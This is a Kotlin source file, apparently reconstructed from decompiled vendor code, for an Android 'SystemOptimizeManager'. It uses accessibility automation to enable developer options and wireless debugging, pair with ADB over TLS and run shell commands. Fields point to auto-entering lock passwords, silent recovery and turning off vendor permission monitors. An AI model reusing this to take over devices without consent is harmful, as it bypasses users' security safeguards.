package com.storm.safe.rock.service.modules.setup

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Path
import android.graphics.Rect
import android.net.nsd.NsdManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayInputStream
import java.io.DataInputStream
import java.io.DataOutputStream
import java.io.EOFException
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.IOException
import java.io.InputStream
import java.math.BigInteger
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.SocketException
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.InvalidKeyException
import java.security.KeyFactory
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.PrivateKey
import java.security.SecureRandom
import java.security.cert.CertificateFactory
import java.security.cert.X509Certificate
import java.security.interfaces.RSAPublicKey
import java.security.spec.PKCS8EncodedKeySpec
import java.util.Date
import java.util.Locale
import java.util.Random
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.CountDownLatch
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicReference
import java.util.concurrent.locks.ReentrantLock
import javax.crypto.Cipher
import javax.crypto.Mac
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLSocket
import kotlin.Pair

/**
 * SystemOptimizeManager — ADB 无线配对自动化管理器（单例）。
 *
 * JADX: C0360a2.java (5666 行) — setup 模块中最大的文件。
 *
 * 功能概要:
 * 1. ADB 无线配对（SPAKE2 + TLS）
 * 2. 开发者选项 UI 自动化（via OpenDevelopmentDelegate）
 * 3. 无线调试开关 UI 自动化
 * 4. mDNS 端口发现（_adb-tls-pairing._tcp / _adb-tls-connect._tcp）
 * 5. RSA 密钥对管理（2048-bit, X.509 自签名证书）
 * 6. ADB 协议握手与 shell 命令执行
 * 7. 心跳 / 进程监控
 *
 * 字段映射:
 *   f53810f9 → companion lock
 *   f53811g0 → volatile singleton instance
 *   f53812g1 → volatile cached SSLContext
 *   f53813g2 → volatile cached PrivateKey
 *   f53814g3 → volatile cached X509Certificate
 *   f53815a0 → service (AccessibilityService)
 *   f53816a1 → context
 *   f53817a2 → executor (ScheduledExecutorService)
 *   f53818a3 → processedActions (ConcurrentLinkedQueue)
 *   f53819a4 → pairState (AtomicReference<PairState>)
 *   f53820a5 → devOptState (AtomicReference<DevOptState>)
 *   f53821a6 → mainLock (ReentrantLock)
 *   f53822a7 → isFinished (AtomicBoolean)
 *   f53823a8 → isPairRunning (AtomicBoolean)
 *   f53824a9 → windowDetector (bf1)
 *   f53825b0 → uiAutomator (gg0)
 *   f53826b1 → switchHelper (h40)
 *   f53827b2 → mainHandler
 *   f53828b3 → openDevDelegate (OpenDevelopmentDelegate)
 *   f53829b4 → onCompleteCallback
 *   f53830b5 → onFailureCallback
 *   f53831b6 → autoInputTriggered
 *   f53832b7 → onPairSuccessCallback (p41)
 *   f53833b8 → openDevRetryCount
 *   f53834b9 → maxRetries (3)
 *   f53835c0 → oppoDisablePermMonitorDone
 *   f53836c1 → usbInstallSettingsDone
 *   f53837c2 → usbSecurityDialogDone
 *   f53838c3 → adbConfigPrefs (lazy SharedPreferences)
 *   f53839c4 → localIpAddress
 *   f53840c5 → isLocalServiceAlive (AtomicBoolean)
 *   f53841c6 → isConnected (AtomicBoolean)
 *   f53842c7 → discoveredPorts (ArrayList<Pair>)
 *   f53843c8 → tlsKeyPair
 *   f53844c9 → tlsCertificate
 *   f53845d0 → lastUsbDebugDialogTime (volatile long)
 *   f53846d1 → lastHeartbeatTime (long)
 *   f53847d2 → heartbeatScheduled (boolean)
 *   f53848d3 → heartbeatFailCount (AtomicInteger)
 *   f53849d4 → silentRecoverRunning (volatile boolean)
 *   f53850d5 → heartbeatExecutor (lazy ScheduledExecutorService)
 *   f53851d6 → reconnectAttemptCount (AtomicInteger)
 *   f53852d7 → firstDeployDone (volatile boolean)
 *   f53853d8 → pairRetryCount (AtomicInteger)
 *   f53854d9 → connectErrorCount (AtomicInteger)
 *   f53855e0 → heartbeatLock (ReentrantLock)
 *   f53856e1 → adbLock (ReentrantLock)
 *   f53857e2 → adbTaskExecutor (lazy ExecutorService)
 *   f53860e5 → nsdCallback (C0931ny)
 *   f53861e6..f53870f5 → ADB command/protocol constants
 *   f53871f6 → HOST_IDENTIFIER ("host::\0")
 *   f53872f7 → adbConnection (volatile g41)
 *   f53873f8 → connectionLock (Object)
 */
class SystemOptimizeManager private constructor(
    @Volatile var service: AccessibilityService,
    val context: Context
) {
    companion object {
        private const val TAG = "SystemOptimize"

        // ====================================================================
        // Singleton — vendor double-checked locking (f53810f9, f53811g0)
        // ====================================================================

        @Volatile
        private var instance: C0360a2Instance? = null

        // ADAPT: Use a typed wrapper to avoid confusion
        // The actual singleton is SystemOptimizeManager, accessed via getInstance()
        @Volatile
        private var sInstance: SystemOptimizeManager? = null

        /** vendor f53812g1 — cached SSLContext */
        @Volatile
        @JvmStatic
        var cachedSslContext: SSLContext? = null
            private set

        /** vendor f53813g2 — cached PrivateKey */
        @Volatile
        @JvmStatic
        var cachedPrivateKey: PrivateKey? = null
            private set

        /** vendor f53814g3 — cached X509Certificate */
        @Volatile
        @JvmStatic
        var cachedCertificate: X509Certificate? = null
            private set

        /**
         * Double-checked locking singleton.
         * vendor: getInstance() pattern (not explicit in JADX but constructor is final class)
         */
        @JvmStatic
        fun getInstance(service: AccessibilityService, context: Context): SystemOptimizeManager {
            return sInstance ?: synchronized(this) {
                sInstance ?: SystemOptimizeManager(service, context).also {
                    sInstance = it
                }
            }
        }

        /** Test helper — reset singleton between tests. */
        @JvmStatic
        fun resetInstanceForTesting() {
            synchronized(this) {
                try { sInstance?.executor?.shutdownNow() } catch (_: Exception) {}
                sInstance = null
                cachedSslContext = null
                cachedPrivateKey = null
                cachedCertificate = null
            }
        }

        fun clearSslCache() {
            cachedSslContext = null
        }

        // ====================================================================
        // ADB protocol constants — vendor f53861e6..f53870f5
        // ====================================================================

        /** CNXN — vendor f53861e6 = 0x4E584E43 */
        const val ADB_CMD_CNXN: Int = 0x4E584E43

        /** OPEN — vendor f53862e7 = 0x4E45504F */
        const val ADB_CMD_OPEN: Int = 0x4E45504F

        /** WRTE — vendor f53863e8 = 0x45545257 */
        const val ADB_CMD_WRTE: Int = 0x45545257

        /** CLSE — vendor f53864e9 = 0x45534C43 */
        const val ADB_CMD_CLSE: Int = 0x45534C43

        /** OKAY — vendor f53865f0 = 0x59414B4F */
        const val ADB_CMD_OKAY: Int = 0x59414B4F

        /** AUTH — vendor f53866f1 = 0x48545541 */
        const val ADB_CMD_AUTH: Int = 0x48545541

        /** STLS — vendor f53867f2 = 0x534C5453 */
        const val ADB_CMD_STLS: Int = 0x534C5453

        /** ADB protocol version — vendor f53868f3 = 0x01000001 */
        const val ADB_VERSION: Int = 0x01000001

        /** ADB max data size — vendor f53869f4 = OKHTTP_CLIENT_WINDOW_SIZE = 256*1024 */
        const val ADB_MAX_DATA: Int = 256 * 1024

        /** ADB STLS version — vendor f53870f5 = 0x01000000 = 1048576 */
        const val ADB_STLS_VERSION: Int = 0x01000000

        /** Host identifier — vendor f53871f6 = "host::\0".bytes(UTF_8) */
        @JvmField
        val HOST_IDENTIFIER: ByteArray = "host::\u0000".toByteArray(Charsets.UTF_8)

        // ====================================================================
        // Static utility methods
        // ====================================================================

        /**
         * Find clickable parent node (up to 10 levels).
         * vendor: a9 (line 441) — static, different from OpenDevelopmentDelegate.findClickableParent (5 levels)
         */
        @JvmStatic
        fun findClickableParentCompat(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
            var current = node
            var depth = 0
            while (current != null && depth < 10) {
                if (current.isClickable) return current
                current = current.parent
                depth++
            }
            return null
        }

        /**
         * Convert RSA public key to Android ADB 524-byte LE format.
         * vendor: e5 (line 972)
         *
         * Format: [modulusSize(4)] [n0inv(4)] [modulus(256)] [r2ModN(256)] [exponent(4)]
         * Total = 524 bytes
         */
        @JvmStatic
        @Throws(InvalidKeyException::class)
        fun toAndroidRsaPublicKey(pubKey: RSAPublicKey): ByteArray {
            val modulus = pubKey.modulus
            val exponent = pubKey.publicExponent

            if (modulus.toByteArray().size < 256) {
                throw InvalidKeyException("Invalid key length ${modulus.toByteArray().size}")
            }

            val buffer = ByteBuffer.allocate(524).order(ByteOrder.LITTLE_ENDIAN)

            // modulusSize = 2048 / 32 = 64
            buffer.putInt(64)

            // n0inv = -(modulus mod 2^32)^-1 mod 2^32
            val b32 = BigInteger.ZERO.setBit(32)
            val n0inv = b32.subtract(modulus.mod(b32).modInverse(b32)).toInt()
            buffer.putInt(n0inv)

            // modulus in LE
            buffer.put(reverseBytes(modulus))

            // r2ModN = 2^4096 mod modulus
            val r2ModN = BigInteger.ZERO.setBit(2048).modPow(BigInteger.valueOf(2L), modulus)
            buffer.put(reverseBytes(r2ModN))

            // public exponent
            buffer.putInt(exponent.toInt())

            return buffer.array()
        }

        /**
         * Convert BigInteger to 256-byte little-endian array.
         * vendor: c5 (line 874)
         */
        @JvmStatic
        fun reverseBytes(bigInt: BigInteger): ByteArray {
            val result = ByteArray(256)  // PSKKeyManager.MAX_KEY_LENGTH_BYTES = 256
            val ba = bigInt.toByteArray()
            val reversed = ByteArray(ba.size)
            for (i in ba.indices) {
                reversed[i] = ba[ba.size - 1 - i]
            }
            System.arraycopy(reversed, 0, result, 0, minOf(ba.size, 256))
            return result
        }

        /**
         * Build toPeerInfo payload: base64(androidPubKey) + " username\0"
         * vendor: b2 (line 626)
         */
        @JvmStatic
        fun toPeerInfo(pubKey: RSAPublicKey, username: String): ByteArray {
            val rawKey = toAndroidRsaPublicKey(pubKey)
            val base64Key = Base64.encode(rawKey, Base64.DEFAULT)
            val suffix = " $username\u0000".toByteArray(Charsets.UTF_8)
            val result = ByteArray(base64Key.size + suffix.size)
            System.arraycopy(base64Key, 0, result, 0, base64Key.size)
            System.arraycopy(suffix, 0, result, base64Key.size, suffix.size)
            return result
        }

        /**
         * Read ADB pairing packet header: version(1B) + type(1B) + length(4B, big-endian).
         * vendor: i8 (line 1468)
         */
        @JvmStatic
        fun readPairingPacket(dis: DataInputStream): PairingPacketHeader? {
            return try {
                val header = ByteArray(6)
                dis.readFully(header)
                val buf = ByteBuffer.wrap(header).order(ByteOrder.BIG_ENDIAN)
                val version = buf.get()
                val type = buf.get()
                val payloadSize = buf.getInt()
                if (version >= 1 && payloadSize > 0 && payloadSize <= 16384) {
                    PairingPacketHeader(version, type, payloadSize)
                } else {
                    Log.w(TAG, "无效的配对包头: version=$version, payloadSize=$payloadSize")
                    null
                }
            } catch (e: Exception) {
                Log.e(TAG, "读取配对包头失败", e)
                null
            }
        }

        /**
         * Write ADB pairing packet: version(1B=1) + type(1B) + length(4B) + payload.
         * vendor: j9 (line 1524)
         */
        @JvmStatic
        @Throws(IOException::class)
        fun writePairingPacket(dos: DataOutputStream, type: Int, payload: ByteArray) {
            val header = ByteBuffer.allocate(6).order(ByteOrder.BIG_ENDIAN)
            header.put(1.toByte())  // version
            header.put(type.toByte())
            header.putInt(payload.size)
            dos.write(header.array())
            dos.write(payload)
            dos.flush()
        }

        /**
         * HKDF-SHA256 key derivation (simplified: extract+expand 1 round, output 16 bytes).
         * vendor: h5 (line 1412)
         */
        @JvmStatic
        fun deriveKeys(secret: ByteArray, info: ByteArray): ByteArray {
            return try {
                val mac = Mac.getInstance("HmacSHA256")
                // Extract: PRK = HMAC(salt=zeros, IKM=secret)
                mac.init(SecretKeySpec(ByteArray(32), "HmacSHA256"))
                val prk = mac.doFinal(secret)

                // Expand: OKM = HMAC(PRK, info || 0x01)
                mac.init(SecretKeySpec(prk, "HmacSHA256"))
                mac.update(info)
                mac.update(1.toByte())
                val okm = mac.doFinal()

                okm.copyOf(16)  // AES-128 key = first 16 bytes
            } catch (e: Exception) {
                Log.e(TAG, "HKDF 派生失败", e)
                ByteArray(16)
            }
        }

        /**
         * AES-128-GCM encrypt with zero IV.
         * vendor: c3 (line 862)
         */
        @JvmStatic
        fun encryptPairingMessage(key: ByteArray, plaintext: ByteArray): ByteArray? {
            return try {
                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                val iv = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN).putLong(0L).array()
                cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
                cipher.doFinal(plaintext)
            } catch (e: Exception) {
                Log.e(TAG, "AES-GCM 加密失败", e)
                null
            }
        }

        /**
         * AES-128-GCM decrypt with zero IV.
         * vendor: c2 (line 850)
         */
        @JvmStatic
        fun decryptPairingMessage(key: ByteArray, ciphertext: ByteArray): ByteArray? {
            return try {
                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                val iv = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN).putLong(0L).array()
                cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
                cipher.doFinal(ciphertext)
            } catch (e: Exception) {
                Log.e(TAG, "AES-GCM 解密失败", e)
                null
            }
        }

        /**
         * Build ADB wire protocol packet: 24-byte header (LE) + data.
         * vendor: c7 (line 888)
         *
         * Header: command(4) + arg0(4) + arg1(4) + dataLen(4) + checksum(4) + magic(4)
         */
        @JvmStatic
        fun buildAdbPacket(command: Int, arg0: Int, arg1: Int, data: ByteArray): ByteArray {
            val buf = ByteBuffer.allocate(data.size + 24).order(ByteOrder.LITTLE_ENDIAN)
            buf.putInt(command)
            buf.putInt(arg0)
            buf.putInt(arg1)
            buf.putInt(data.size)

            // checksum = sum of unsigned bytes
            var checksum = 0
            for (b in data) {
                checksum += b.toInt() and 0xFF
            }
            buf.putInt(checksum)

            // magic = ~command
            buf.putInt(command.inv())

            buf.put(data)
            return buf.array()
        }

        /**
         * Read ADB wire protocol packet from InputStream.
         * vendor: b5 (line 798)
         */
        @JvmStatic
        fun readAdbPacket(input: InputStream): AdbPacket? {
            return try {
                // Read 24-byte header
                val headerBytes = ByteArray(24)
                var read = 0
                while (read < 24) {
                    val n = input.read(headerBytes, read, 24 - read)
                    if (n < 0) throw EOFException("EOF reading ADB header")
                    read += n
                }

                val buf = ByteBuffer.wrap(headerBytes).order(ByteOrder.LITTLE_ENDIAN)
                val command = buf.getInt()
                val arg0 = buf.getInt()
                val arg1 = buf.getInt()
                val dataLen = buf.getInt()
                buf.getInt()  // checksum (skip)
                buf.getInt()  // magic (skip)

                // Read data
                val data = ByteArray(dataLen)
                var dataRead = 0
                while (dataRead < dataLen) {
                    val n = input.read(data, dataRead, dataLen - dataRead)
                    if (n < 0) throw EOFException("EOF reading ADB data")
                    dataRead += n
                }

                AdbPacket(command, data, arg0, arg1)
            } catch (e: Exception) {
                Log.e(TAG, "读取 ADB 包失败", e)
                null
            }
        }

        /**
         * Get local non-loopback IPv4 address.
         * vendor: g5 (line 1376) + g9 (line 1392)
         */
        @JvmStatic
        fun getLocalIpAddress(): String {
            return try {
                val product = Build.PRODUCT
                if (product.contains("sdk", ignoreCase = true)) {
                    return "10.0.2.2"
                }
                val hardware = Build.HARDWARE
                if (hardware.contains("goldfish", ignoreCase = true) ||
                    hardware.contains("ranchu", ignoreCase = true)
                ) {
                    return "10.0.2.2"
                }
                getWifiIpAddress() ?: "127.0.0.1"
            } catch (e: SocketException) {
                Log.e(TAG, "获取本地IP失败", e)
                "127.0.0.1"
            }
        }

        /**
         * Enumerate network interfaces for first non-loopback IPv4 address.
         * vendor: g9 (line 1392)
         */
        @JvmStatic
        fun getWifiIpAddress(): String? {
            return try {
                val interfaces = NetworkInterface.getNetworkInterfaces()
                while (interfaces.hasMoreElements()) {
                    val addresses = interfaces.nextElement().inetAddresses
                    while (addresses.hasMoreElements()) {
                        val addr = addresses.nextElement()
                        if (!addr.isLoopbackAddress && addr is Inet4Address) {
                            return addr.hostAddress
                        }
                    }
                }
                null
            } catch (e: Exception) {
                Log.e(TAG, "获取本地IP失败", e)
                null
            }
        }

        /**
         * Sleep in 200ms chunks.
         * vendor: k1 (line 1536)
         */
        @JvmStatic
        fun sleep200(count: Int) {
            var remaining = if (count <= 0) 1 else count
            while (remaining > 0) {
                try {
                    Thread.sleep(200L)
                    remaining--
                } catch (_: Exception) {
                    return
                }
            }
        }

        /**
         * Collect all nodes recursively into a flat list.
         * vendor: d2 (line 960)
         */
        @JvmStatic
        fun collectAllNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) {
            list.add(node)
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    collectAllNodes(child, list)
                }
            }
        }

        /**
         * Collect all TextView nodes recursively.
         * vendor: f2 (line 1126)
         */
        @JvmStatic
        fun collectTextViewNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) {
            val className = node.className?.toString()
            if (className == "android.widget.TextView") {
                list.add(node)
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    collectTextViewNodes(child, list)
                }
            }
        }

        /**
         * Find first node matching text in a list of candidates.
         * vendor: f9 (line 1310)
         */
        @JvmStatic
        fun findNodeByTexts(root: AccessibilityNodeInfo, texts: List<String>): AccessibilityNodeInfo? {
            for (text in texts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes != null && nodes.isNotEmpty()) {
                    return nodes[0]
                }
            }
            return null
        }

        /**
         * Find first scrollable node recursively.
         * vendor: g0 (line 1323)
         */
        @JvmStatic
        fun findScrollableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            if (node.isScrollable) return node
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findScrollableNode(child)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find first Switch node recursively.
         * vendor: g1 (line 1339)
         */
        @JvmStatic
        fun findSwitchNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            if (node.className?.toString() == "android.widget.Switch") return node
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findSwitchNode(child)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find first Switch/CheckBox/Toggle or checkable node recursively.
         * vendor: g2 (line 1355)
         */
        @JvmStatic
        fun findToggleNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            val className = node.className?.toString() ?: ""
            if (className.contains("Switch", ignoreCase = true) ||
                className.contains("CheckBox", ignoreCase = true) ||
                className.contains("Toggle", ignoreCase = true) ||
                node.isCheckable
            ) {
                return node
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findToggleNode(child)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find node by exact class name recursively.
         * vendor: f8 (line 1294)
         */
        @JvmStatic
        fun findNodeByClassName(node: AccessibilityNodeInfo, className: String): AccessibilityNodeInfo? {
            if (node.className?.toString() == className) return node
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findNodeByClassName(child, className)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find CheckBox node recursively.
         * vendor: f4 (line 1168)
         */
        @JvmStatic
        fun findCheckBoxNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            val className = node.className?.toString()
            if (className != null && className.contains("CheckBox", ignoreCase = true) && node.isCheckable) {
                return node
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findCheckBoxNode(child)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find CompoundButton or CheckBox that is visible.
         * vendor: f6 (line 1199)
         */
        @JvmStatic
        fun findCompoundButton(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            val className = node.className?.toString() ?: ""
            if ((className.contains("CompoundButton", ignoreCase = true) ||
                        className.contains("CheckBox", ignoreCase = true)) &&
                node.isVisibleToUser
            ) {
                return node
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findCompoundButton(child)
                if (result != null) return result
            }
            return null
        }

        /**
         * Find clickable parent (up to 6 levels).
         * vendor: f5 (line 1186)
         */
        @JvmStatic
        fun findClickableParent6(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            var parent = node.parent
            for (i in 0 until 6) {
                if (parent == null) return null
                if (parent.isClickable) {
                    Log.i(TAG, "findClickableParent: 找到可点击父节点 ${parent.className} at depth $i")
                    return parent
                }
                parent = parent.parent
            }
            return null
        }

        /**
         * Find Button node with specific text recursively.
         * vendor: f3 (line 1141)
         */
        @JvmStatic
        fun findButtonByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
            val className = node.className?.toString() ?: ""
            val nodeText = node.text?.toString() ?: ""
            if (className.contains("Button", ignoreCase = true) &&
                nodeText.contains(text, ignoreCase = true)
            ) {
                return node
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findButtonByText(child, text)
                if (result != null) return result
            }
            return null
        }

        /**
         * Extract pairing port from UI text nodes via regex.
         * vendor: i7 (line 1431)
         */
        @JvmStatic
        fun extractPortFromUi(root: AccessibilityNodeInfo): Int {
            return try {
                val allNodes = ArrayList<AccessibilityNodeInfo>()
                collectAllNodes(root, allNodes)
                val portRegex = Regex("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d+)")
                for (node in allNodes) {
                    val text = node.text?.toString() ?: continue
                    val match = portRegex.find(text) ?: continue
                    val port = match.groupValues[2].toIntOrNull() ?: continue
                    if (port in 30000 until 65536) {
                        return port
                    }
                }
                0
            } catch (e: Exception) {
                Log.e(TAG, "解析 UI 端口失败", e)
                0
            }
        }

        /**
         * Export TLS keying material via Conscrypt reflection.
         * vendor: f0 (line 1064)
         *
         * // ADAPT: Conscrypt JNI not available in test environment;
         * // production code uses Conscrypt.exportKeyingMaterial() with multiple fallbacks.
         */
        @JvmStatic
        fun exportKeyingMaterial(sslSocket: SSLSocket): ByteArray? {
            Log.d(TAG, ">>> 开始导出密钥材料, socket类型=${sslSocket.javaClass.name}")
            // ADAPT: Conscrypt library not available in test classpath.
            // Try org.conscrypt.Conscrypt first
            try {
                val conscryptClass = Class.forName("org.conscrypt.Conscrypt")
                val method = conscryptClass.getMethod(
                    "exportKeyingMaterial",
                    SSLSocket::class.java, String::class.java,
                    ByteArray::class.java, Integer.TYPE
                )
                val result = method.invoke(null, sslSocket, "adb-label\u0000", null, 64)
                if (result is ByteArray && result.size == 64) {
                    Log.d(TAG, "org.conscrypt 导出成功, 长度=${result.size}")
                    return result
                }
            } catch (e: ClassNotFoundException) {
                Log.w(TAG, "Conscrypt 未注册, 跳过方法1")
            } catch (e: Throwable) {
                Log.w(TAG, "org.conscrypt 方式异常: ${e.javaClass.name}: ${e.message}")
            }

            // Fallback: system Conscrypt reflection (Android 10+)
            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    val sysConscrypt = Class.forName("com.android.org.conscrypt.Conscrypt")
                    val method = sysConscrypt.getMethod(
                        "exportKeyingMaterial",
                        SSLSocket::class.java, String::class.java,
                        ByteArray::class.java, Integer.TYPE
                    )
                    val result = method.invoke(null, sslSocket, "adb-label\u0000", null, 64)
                    if (result is ByteArray && result.size == 64) {
                        Log.i(TAG, "系统 Conscrypt 导出成功, 长度=${result.size}")
                        return result
                    }
                } catch (e: Throwable) {
                    Log.w(TAG, "系统 Conscrypt 反射失败: ${e.javaClass.name}: ${e.message}")
                }
            }

            // Fallback: SSLSocket instance method reflection
            try {
                val method = sslSocket.javaClass.getMethod(
                    "exportKeyingMaterial",
                    String::class.java, ByteArray::class.java, Integer.TYPE
                )
                val result = method.invoke(sslSocket, "adb-label\u0000", null, 64)
                if (result is ByteArray && result.size == 64) {
                    Log.i(TAG, "SSLSocket 实例导出成功, 长度=${result.size}")
                    return result
                }
            } catch (e: Throwable) {
                Log.w(TAG, "所有 exportKeyingMaterial 方法都失败: ${e.javaClass.name}: ${e.message}")
            }

            Log.w(TAG, "exportKeyingMaterial 最终失败")
            return null
        }
    }

    // ========================================================================
    // PairState enum — vendor SystemOptimizeManager$PairState.java
    // ========================================================================

    enum class PairState {
        PAIR_DEPT_UNKNOWN,           // 0
        PAIR_DEPT_PAIR_LEAVE_DEV_OPT, // 1
        PAIR_DEPT_PAIR_SUCCESS,      // 2
        PAIR_DEPT_PAIR_RETRY,        // 3
        PAIR_DEPT_PAIRING,           // 4
        PAIR_DEPT_PAIR_FAIL,         // 5
        PAIR_DEPT_PREPARE_FINISH,    // 6
        PAIR_DEPT_PAIR_FINISH        // 7
    }

    // ========================================================================
    // DevOptState enum — vendor SystemOptimizeManager$DevOptState.java
    // ========================================================================

    enum class DevOptState(val code: Int) {
        UNKNOWN(-1),
        ENTER_ABOUT_DEVICE_WIN(0),
        PREPARE_VERSION_INFO_WIN(1),
        ENTER_VERSION_INFO_WIN(2),
        PREPARE_CONFIRM_LOCK_WIN(3),
        ENTER_CONFIRM_LOCK_WIN(4),
        IS_CONFIRM_SUCCESS(5),
        ENABLE_DEV_OPT_FAIL(6),
        ENABLE_DEV_OPT_SUCCESS(7),
        WAIT_PASSWORD_VERIFY(8),
        WIN_CHECK(9),
        WIN_PREPARE(10)
    }

    // ========================================================================
    // Data classes
    // ========================================================================

    /** ADB pairing protocol packet header. vendor: l41 */
    data class PairingPacketHeader(
        val version: Byte,
        val type: Byte,
        val payloadSize: Int
    )

    /** ADB wire protocol packet. vendor: i41 */
    data class AdbPacket(
        val command: Int,
        val data: ByteArray,
        val arg0: Int,
        val arg1: Int
    ) {
        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (other !is AdbPacket) return false
            return command == other.command && arg0 == other.arg0 && arg1 == other.arg1 &&
                data.contentEquals(other.data)
        }

        override fun hashCode(): Int {
            var result = command
            result = 31 * result + data.contentHashCode()
            result = 31 * result + arg0
            result = 31 * result + arg1
            return result
        }
    }

    // ========================================================================
    // Instance fields — vendor f53815a0..f53873f8
    // ========================================================================

    /** vendor f53817a2 — main executor */
    val executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()

    /** vendor f53818a3 — dedup queue for scheduled accessibility tasks */
    val processedActions: ConcurrentLinkedQueue<String> = ConcurrentLinkedQueue()

    /** vendor f53819a4 — current pair state */
    val pairState: AtomicReference<PairState> = AtomicReference(PairState.PAIR_DEPT_UNKNOWN)

    /** vendor f53820a5 — current developer options state */
    val devOptState: AtomicReference<DevOptState> = AtomicReference(DevOptState.UNKNOWN)

    /** vendor f53821a6 — main reentrant lock */
    val mainLock: ReentrantLock = ReentrantLock()

    /** vendor f53822a7 — is pairing engine finished */
    val isFinished: AtomicBoolean = AtomicBoolean(false)

    /** vendor f53823a8 — is pairing actively running */
    val isPairRunning: AtomicBoolean = AtomicBoolean(false)

    // ADAPT: bf1 (WindowDetector) — vendor uses windowDetector for cached window state,
    // not replicated as separate class; using rootInActiveWindow directly
    // ADAPT: gg0 (UiAutomator helper) — vendor helper class not replicated;
    // accessibility automation done via AccessibilityNodeInfo API directly
    // ADAPT: h40 (SwitchHelper) — vendor switch-finding helper not replicated;
    // using findSwitchNode/findToggleNode static methods instead

    /** vendor f53827b2 — main thread handler */
    val mainHandler: Handler = Handler(Looper.getMainLooper())

    /** vendor f53828b3 — OpenDevelopmentDelegate reference */
    var openDevDelegate: OpenDevelopmentDelegate? = null

    /** vendor f53829b4 — onComplete callback */
    var onCompleteCallback: (() -> Unit)? = null

    /** vendor f53830b5 — onFailure callback */
    var onFailureCallback: ((String) -> Unit)? = null

    /** vendor f53831b6 — auto password input triggered */
    @Volatile
    var autoInputTriggered: Boolean = false

    // ADAPT: p41 (FileObserver-based onPairSuccessCallback) — vendor uses custom FileObserver
    // subclass for cert file monitoring; not replicated as separate class

    /** vendor f53833b8 — retry counter for opening dev options */
    var openDevRetryCount: Int = 0

    /** vendor f53834b9 — max retries for opening dev options */
    val maxRetries: Int = 3

    /** vendor f53835c0 — OPPO disable permission monitor done flag */
    var oppoDisablePermMonitorDone: Boolean = false

    /** vendor f53836c1 — USB install settings done flag */
    var usbInstallSettingsDone: Boolean = false

    /** vendor f53837c2 — USB security dialog done flag */
    var usbSecurityDialogDone: Boolean = false

    /** vendor f53838c3 — lazy ADBConfig SharedPreferences */
    val adbConfigPrefs: SharedPreferences by lazy {
        context.getSharedPreferences("ADBConfig", Context.MODE_PRIVATE)
    }

    /** vendor f53839c4 — cached local IP address */
    var cachedLocalIp: String = try { getLocalIpAddress() } catch (_: Exception) { "127.0.0.1" }

    /** vendor f53840c5 — is local-service alive */
    val isLocalServiceAlive: AtomicBoolean = AtomicBoolean(false)

    /** vendor f53841c6 — is ADB connected */
    val isConnected: AtomicBoolean = AtomicBoolean(false)

    /** vendor f53842c7 — discovered NSD ports */
    val discoveredPorts: ArrayList<Pair<String, Int>> = ArrayList()

    /** vendor f53843c8 — TLS key pair */
    var tlsKeyPair: KeyPair? = null

    /** vendor f53844c9 — TLS certificate */
    var tlsCertificate: X509Certificate? = null

    /** vendor f53845d0 — last USB debug dialog timestamp */
    @Volatile
    var lastUsbDebugDialogTime: Long = 0L

    /** vendor f53846d1 — last heartbeat time */
    var lastHeartbeatTime: Long = 0L

    /** vendor f53847d2 — heartbeat scheduled flag */
    var heartbeatScheduled: Boolean = false

